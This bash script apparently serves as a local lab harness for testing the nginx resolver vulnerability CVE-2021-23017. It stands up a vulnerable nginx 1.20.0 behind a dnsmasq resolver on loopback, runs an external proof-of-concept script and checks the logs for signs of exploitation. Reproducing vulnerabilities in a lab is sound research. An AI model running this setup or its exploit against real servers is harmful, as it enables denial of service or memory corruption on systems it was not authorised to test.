#!/usr/bin/env bash
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
python3 -c "import scapy" 2>/dev/null || pip3 install -q scapy
pkill -f "$LAB/nginx-" 2>/dev/null||true
pkill dnsmasq 2>/dev/null||true
sleep 1
cat >"$LAB/conf/23017.conf" <<EOF
worker_processes 1;
error_log $LAB/23017-error.log info;
pid $LAB/23017.pid;
events { worker_connections 64; }
http {
    resolver 127.0.0.53 valid=30s ipv6=off;
    server {
        listen 23017;
        location / {
            set \$u "http://resolve.test/";
            proxy_pass \$u;
        }
    }
}
EOF
dnsmasq --keep-in-foreground --port=53 --listen-address=127.0.0.53 --no-hosts --no-resolv &
d=$!
sleep 1
"$LAB/nginx-1.20.0/sbin/nginx" -c "$LAB/conf/23017.conf"
timeout 15 python3 "$POCLAB/pocs/CVE-2021-23017/poc.py" -t 127.0.0.1 -r 127.0.0.53 &
p=$!
sleep 2
curl -sf --max-time 5 http://127.0.0.1:23017/ >/dev/null || true
wait $p
echo poc_exit=$?
grep -E "exploited|signal|alert" "$LAB/23017-error.log" 2>/dev/null | tail -5
kill $d 2>/dev/null||true
